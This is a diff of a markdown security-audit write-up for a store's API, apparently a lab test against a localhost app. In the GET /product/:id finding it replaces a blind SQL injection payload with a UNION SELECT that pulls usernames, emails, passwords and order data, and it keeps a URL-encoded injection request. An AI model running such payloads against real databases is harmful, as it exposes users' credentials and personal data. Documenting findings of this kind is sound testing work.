@@ -166,11 +166,11 @@ This exposes userid, username, email, contact, type, profile_pic_url, created_at
 ### 14. GET /category
 ### 16. GET /product/:id
 
-> :fire: **Critical:** A3 (brief): Blind SQLi. Medium risk as the injected code cannot escape the GROUP BY p.productid statement and therefore will need to work around it. Current found payload can output only the last row of any table. 
+> :fire: **Critical:** A3 (brief): SQLi. The risk is the confidientiality of all information stored in the store's MySQL instance
 
-Blind sqli guessing the tables
+Emotional damage
 ```sql
-8 GROUP BY p.productid UNION SELECT null, null, null, null, null, null, null, null, null, p.productid, table_schema, table_name FROM INFORMATION_SCHEMA.TABLES, product p WHERE table_name = 'user'
+1 UNION SELECT null, o.userid, o.cart, o.total, u.username, u.email, u.contact, u.password, u.type, u.profile_pic_url, i.table_name, i.table_schema FROM user u, INFORMATION_SCHEMA.TABLES i, orders o UNION SELECT null, null, null, null, null, null, null, null, null, p.productid, null, null FROM product p
 ```
 
 http://localhost:8081/product/8%20GROUP%20BY%20p.productid%20UNION%20SELECT%20null,%20null,%20null,%20null,%20null,%20null,%20null,%20null,%20null,%20p.productid,%20table_schema,%20table_name%20FROM%20INFORMATION_SCHEMA.TABLES,%20product%20p
